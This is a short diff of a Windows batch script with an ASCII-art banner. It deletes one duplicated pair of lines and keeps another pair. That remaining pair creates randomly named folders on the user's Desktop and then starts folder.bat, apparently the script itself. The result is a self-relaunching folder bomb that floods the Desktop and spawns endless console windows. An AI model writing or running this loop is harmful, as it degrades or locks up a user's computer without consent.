@@ -12,8 +12,5 @@ echo	░ ░ ░ ▒   ░      ░      ░   ░ ░    ░   ░   ▒
 echo		░ ░         ░      ░  ░      ░       ░  ░                                                                                                                                                 
 echo.
 
-
-md "%USERPROFILE%\Desktop\%RANDOM%"
-start folder.bat
 md "%USERPROFILE%\Desktop\%RANDOM%"
 start folder.bat
